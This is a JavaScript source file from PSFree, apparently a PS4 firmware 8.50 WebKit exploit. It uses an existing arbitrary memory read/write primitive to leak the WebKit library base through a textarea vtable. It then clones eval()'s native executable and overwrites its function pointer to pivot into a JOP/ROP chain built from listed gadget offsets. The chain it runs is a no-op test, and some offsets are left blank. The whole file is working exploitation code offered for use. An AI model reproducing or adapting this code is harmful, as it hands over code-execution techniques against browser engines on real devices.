/* Copyright (C) 2023 anonymous

This file is part of PSFree.

PSFree is free software: you can redistribute it and/or modify
it under the terms of the GNU Affero General Public License as
published by the Free Software Foundation, either version 3 of the
License, or (at your option) any later version.

PSFree is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU Affero General Public License for more details.

You should have received a copy of the GNU Affero General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.  */

import * as config from './config.mjs';

import { Int } from './module/int64.mjs';
import { debug_log, align, die } from './module/utils.mjs';
import { Addr, mem } from './module/mem.mjs';
import { KB, MB } from './module/constants.mjs';
import { ChainBase } from './module/chain.mjs';

import {
    make_buffer,
    find_base,
    get_view_vector,
    resolve_import,
    init_syscall_array,
} from './module/memtools.mjs';

import * as rw from './module/rw.mjs';
import * as o from './module/offset.mjs';

const origin = window.origin;
const port = '8000';
const url = `${origin}:${port}`;

const syscall_array = [];

const offset_func_classinfo = 0x10
const offset_func_exec = 0x18;
const offset_textarea_impl = 0x18;
const offset_js_inline_prop = 0x10;

// libSceNKWebKit.sprx
let libwebkit_base = null;
// search for the JOP gadgets

// e.g. jop1:
// 'mov rdi, qword ptr [rdi + 0x30] ; mov rax qword ptr [rdi] ; jmp qword ptr [rax + 8]

// gadgets for the JOP chain
const jop1 = `
mov rdi, qword ptr [rdi + 0x30]
mov rax, qword ptr [rdi]
jmp qword ptr [rax + 8]
`;
const jop2 = `
push rbp
mov rbp, rsp
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x30]
`;
const jop3 = `
mov rdx, qword ptr [rax + 0x18]
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x10]
`;
const jop4 = `
push rdx
mov edi, 0xac9784fe
jmp qword ptr [rax]
`;
const jop5 = 'pop rsp; ret';

// The JOP chain pushed rbp and moved rsp to rbp before the pivot. The chain
// must save rbp (rsp before the pivot) somewhere if it uses it. The chain must
// restore rbp (if needed) before the epilogue.
//
// The epilogue will move rbp to rsp (restore old rsp) and pop rbp (which we
// pushed earlier before the pivot, thus restoring the old rbp).
//
// leave instruction equivalent:
//     mov rsp, rbp
//     pop rbp
const rop_epilogue = 'leave; ret';

// put missing offset for instruction
// e.g.
//     'pop rax; ret' : 0x<offset>,
const webkit_gadget_offsets = new Map(Object.entries({
    /* ignore these for now
    'pop rax; ret' : ,
    'pop rbx; ret' : ,
    'pop rcx; ret' : ,
    'pop rdx; ret' : ,

    'pop rbp; ret' : ,
    'pop rsi; ret' : ,
    'pop rdi; ret' : ,
    'pop rsp; ret' : ,

    'pop r8; ret' : ,
    'pop r9; ret' : ,
    'pop r10; ret' : ,
    'pop r11; ret' : ,

    'pop r12; ret' : ,
    'pop r13; ret' : ,
    'pop r14; ret' : ,
    'pop r15; ret' : ,

    'ret' : ,
    'leave; ret' : ,

    'neg rax; and rax, rcx; ret' : 0x0000000000e85f24,
    'adc esi, esi; ret' : 0x000000000088cbb9,
    'add rax, rdx; ret' : 0x00000000003cd92c,
    'push rsp; jmp qword ptr [rax]' : 0x0000000001abbc92,
    'add rcx, rsi; and rdx, rcx; or rax, rdx; ret' : 0x0000000000b8bc06,
    'pop rdi; jmp qword ptr [rax + 0x50]' : 0x00000000021f9e8e,

    'mov qword ptr [rdi], rsi; ret' : 0x0000000000034a40,
    'mov rax, qword ptr [rax]; ret' : 0x000000000002dc62,
    'mov qword ptr [rdi], rax; ret' : 0x000000000005b1bb,
    'mov rdx, rcx; ret' : 0x0000000000eae9fd,

    [jop1] : ,
    [jop2] : ,
    [jop3] : ,
    [jop4] : ,
    */
}));

const gadgets = new Map();

function get_bases() {
    const textarea = document.createElement('textarea');
    const webcore_textarea = mem.addrof(textarea).readp(offset_textarea_impl);
    const textarea_vtable = webcore_textarea.readp(0);
    const libwebkit_base = find_base(textarea_vtable, true, true);

    /*
    const stack_chk_fail_import =
        libwebkit_base
        .add(offset_wk_stack_chk_fail)
    ;
    const stack_chk_fail_addr = resolve_import(
        stack_chk_fail_import,
        true,
        true
    );
    const libkernel_base = find_base(stack_chk_fail_addr, true, true);

    const memcpy_import = libwebkit_base.add(offset_wk_memcpy);
    const memcpy_addr = resolve_import(memcpy_import, true, true);
    const libc_base = find_base(memcpy_addr, true, true);
    */

    return [
        libwebkit_base,
        //libkernel_base,
        //libc_base,
    ];
}

function init_gadget_map(gadget_map, offset_map, base_addr) {
    for (const [insn, offset] of offset_map) {
        gadget_map.set(insn, base_addr.add(offset));
    }
}

// Creates a JSValue with the supplied 64-bit argument
//
// JSValues are 64-bit integers representing a JavaScript value (primitives and
// objects), but not all possible 64-bit values are JSValues. So be careful in
// using this value in situations expecting a valid JSValue.
//
// See WebKit/Source/JavaScriptCore/runtime/JSCJSValue.h at webkitgtk 2.34.4.
// Look for USE(JSVALUE64) since the PS4 platform is 64-bit.
function create_jsvalue(value) {
    // Small enough object so that the "value" property is inlined, it is not
    // at the butterfly.
    const res = {value : 0};
    // change the inlined JSValue
    mem.addrof(res).write64(offset_js_inline_prop, value);
    return res.value;
}

// We create a JSFunction clone of eval(). Built-in functions have function
// pointers we can overwrite for code execution. We creates clones instead of
// modifying a built-in, so that multiple ROP chains do not need to share the
// same function.
function create_builtin() {
    function func() {}

    // JSC::JSFunction
    const js_func = mem.addrof(func);
    // eval() is a built-in function
    const js_func_eval = mem.addrof(eval);

    // We need to copy eval()'s JSC::ClassInfo for the JavaScript VM to accept
    // the function as built-in.
    js_func.write64(
        offset_func_classinfo,
        js_func_eval.read64(offset_func_classinfo)
    );
    // Clone eval()'s m_executableOrRareData (type is JSC::NativeExecutable
    // since eval() is a built-in). Its size is 0x58 for PS4 8.03.
    const exec = make_buffer(js_func_eval.readp(offset_func_exec), 0x58);
    const exec_view = new Uint8Array(exec.slice(0));
    const exec_view_vector = get_view_vector(exec_view);

    js_func.write64(offset_func_exec, exec_view_vector);
    // Maintain a reference to the view of the cloned m_executableOrRareData or
    // it will be garbage collected.
    func.exec = exec_view;

    return func;
}

// Chain for PS4 8.50
class Chain850 extends ChainBase {
    constructor() {
        super();

        // for the JOP chain
        const rax_ptrs = new Uint8Array(0x100);
        const rax_ptrs_p = get_view_vector(rax_ptrs);
        this.rax_ptrs = rax_ptrs;

        rw.write64(rax_ptrs, 8, this.get_gadget(jop2));
        rw.write64(rax_ptrs, 0x30, this.get_gadget(jop3));
        rw.write64(rax_ptrs, 0x10, this.get_gadget(jop4));
        rw.write64(rax_ptrs, 0, this.get_gadget(jop5));
        // value to pivot rsp to
        rw.write64(this.rax_ptrs, 0x18, this.stack_addr);

        const jop_buffer = new Uint8Array(8);
        const jop_buffer_p = get_view_vector(jop_buffer);
        this.jop_buffer = jop_buffer;

        rw.write64(jop_buffer, 0, rax_ptrs_p);

        this.func = create_builtin();
        // JSC::JSFunction::m_executableOrRareData
        const func_exec = mem.addrof(this.func).readp(offset_func_exec)
        this.func_argument = create_jsvalue(jop_buffer_p);

        // JSC::NativeExecutable::m_function
        func_exec.write64(0x38, this.get_gadget(jop1));
    }

    run() {
        this.check_stale();
        this.check_is_empty();
        this.check_is_branching();

        // jump to JOP chain
        this.func(this.func_argument);
    }
}
const Chain = Chain850;

function rop() {
    [libwebkit_base] = get_bases();
    init_gadget_map(gadgets, webkit_gadget_offsets, libwebkit_base);
    Chain.init_class(gadgets, syscall_array);

    const chain = new Chain();

    chain.push_gadget('leave; ret');

    // the ROP chain is a noop, if we crashed, then we did something wrong
    alert('going to run()');
  
    alert('returned successfully');
    debug_log('returned successfully');

    /*
    const view = new Uint8Array(1);
    const vector = get_view_vector(view);

    const offset = 0x0000000000093de0;
    // mov rax, qword ptr [rdi + 0x30]; ret
    const insn = libwebkit_base.add(offset);
    const func = mem.addrof(eval).readp(offset_func_exec);
    func.write64(0x38, insn);

    const obj = {a : 0};
    const res = eval(create_jsvalue(vector));
    obj.a = res;

    // read inline property
    const res2 = mem.addrof(obj).read64(offset_js_inline_prop);
    debug_log(`res2: ${res2}`);
    debug_log(`vector: ${vector}`);
    */
}

rop();
